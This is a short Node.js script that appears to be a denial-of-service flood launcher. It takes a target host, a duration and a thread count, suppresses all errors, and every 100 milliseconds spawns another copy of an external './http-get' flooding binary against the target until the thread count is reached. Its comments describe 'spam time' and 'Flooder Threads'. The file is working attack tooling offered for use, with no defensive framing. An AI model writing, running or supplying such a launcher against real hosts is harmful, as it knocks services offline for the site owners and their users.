const { spawn } = require('child_process');
const fs = require('fs');

process.on('uncaughtException', function (er) {
});
process.on('unhandledRejection', function (er) {
});

require('events').EventEmitter.defaultMaxListeners = 0;

if (process.argv.length < 5) {
    console.log("node index.js <host> <time> <threads>");
    process.exit(-1);
}

const urlT = process.argv[2]; // url
const timeT = process.argv[3]; // spam time
const threadsT = process.argv[4]; // Flooder Threads

function launchChild() {
    const child = spawn('./http-get', [urlT, "200", timeT]);

    child.stdout.on('data', (data) => {
        console.log(`stdout: ${data}`);
    });

    child.stderr.on('data', (data) => {
        console.error(`stderr: ${data}`);
    });

    child.on('error', (error) => {
        console.error(`error: ${error.message}`);
    });

    child.on('close', (code) => {
        console.log(`child process exited with code ${code}`);
    });
}

function main() {
    console.log("Program started!");
    let count = 0;
    const interval = setInterval(() => {
        if (count < threadsT) {
            launchChild();
            count++;
        } else {
            clearInterval(interval);
        }
    }, 100);
}

main();

setTimeout(() => {
    process.exit(0);
    process.exit(0);
    process.exit(0);
}, timeT * 1000);
